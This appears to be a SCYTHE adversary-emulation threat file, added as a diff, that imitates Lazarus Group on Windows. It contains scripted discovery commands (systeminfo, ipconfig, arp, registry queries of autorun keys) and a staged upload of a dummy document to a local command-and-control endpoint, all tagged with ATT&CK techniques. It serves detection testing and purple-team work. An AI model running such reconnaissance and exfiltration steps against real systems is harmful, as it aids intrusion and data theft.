@@ -1,0 +1,334 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Lazarus Group is a North Korean state-sponsored hacking group that advances state focused initiatives including theft of intellectual property, financial fraud and theft, and retaliatory campaigns.",
+        "display_name": "Threat Thursday - Lazarus",
+        "name": "Threat Thursday - Lazarus",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "127.0.0.1:443",
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "enumwindows",
+                "request": "--load enumwindows",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "4a72f9fb-a63f-45fd-afa9-9e515e53225b",
+                "module": "enumwindows",
+                "request": "--class --pid --processname --tid --wid",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1010"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "processes",
+                "request": "--load processes",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "search",
+                "request": "--load search",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir %USERPROFILE%\\Documents",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c systeminfo",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c ipconfig /all",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c netsh interface show",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c arp -a",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c nbtstat -n",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net config",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\.lazarus_emu\"",
+                "rtags": [
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1564.001"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\.lazarus_emu\\important.docx\" --size 1MB --random",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\.lazarus_emu\\important.docx\"",
+                "rtags": [
+                    "att&ck-technique:T1041",
+                    "att&ck-technique:T1005",
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S \"\"%USERPROFILE%\\Desktop\\.lazarus_emu\"\"",
+                "rtags": [
+                    "att&ck-technique:T1551.004"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
